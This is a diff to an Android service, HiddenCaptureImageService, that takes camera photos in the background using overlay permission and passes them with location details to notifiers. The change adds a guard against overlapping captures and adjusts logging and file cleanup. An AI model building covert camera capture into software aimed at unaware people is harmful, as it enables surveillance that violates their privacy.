@@ -59,6 +59,8 @@ public class HiddenCaptureImageService extends HiddenCameraService implements On
     private String sender = null, app = null;
     private Location location;
 
+    private static boolean isRunning = false;
+
     @Override
     public void onCreate() {
         super.onCreate();
@@ -80,11 +82,13 @@ public class HiddenCaptureImageService extends HiddenCameraService implements On
 
         if (Permissions.haveCameraPermission(this)) {
 
-            if (HiddenCameraUtils.canOverDrawOtherApps(this)) {
+            if (HiddenCameraUtils.canOverDrawOtherApps(this) && !isRunning) {
 
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     startForeground(NotificationUtils.WORKER_NOTIFICATION_ID, NotificationUtils.buildWorkerNotification(this));
                 }
+
+                isRunning = true;
 
                 CameraConfig cameraConfig = new CameraConfig()
                         .getBuilder(this)
@@ -116,7 +120,11 @@ public class HiddenCaptureImageService extends HiddenCameraService implements On
                 stopSelf();
             }
         } else {
-            Log.e(TAG, "Camera permission not available");
+            if (isRunning) {
+                Log.e(TAG, "Camera is running. Skipping this request!");
+            } else {
+                Log.e(TAG, "Camera permission not available!");
+            }
             stopSelf();
         }
 
@@ -190,7 +198,7 @@ public class HiddenCaptureImageService extends HiddenCameraService implements On
                             } else {
                                 Log.d(TAG, "Unable to send notification. No notifiers are set.");
                             }
-                            Files.deleteFileFromContextDir(imageFile.getName(), HiddenCaptureImageService.this, true);
+                            Files.deleteFileFromCache(imageFile.getName(), HiddenCaptureImageService.this, true);
                         } else {
                             Log.e(TAG, "Received error response: " + imageUrl);
                             Log.d(TAG, "Image will be saved to local storage: " + imageFile.getAbsolutePath());
@@ -210,6 +218,7 @@ public class HiddenCaptureImageService extends HiddenCameraService implements On
             Log.d(TAG, "Camera photo deleted: " + deleted);
         }
 
+        isRunning = false;
         stopSelf();
     }
 
@@ -241,6 +250,7 @@ public class HiddenCaptureImageService extends HiddenCameraService implements On
                 break;
         }
 
+        isRunning = false;
         stopSelf();
     }
 
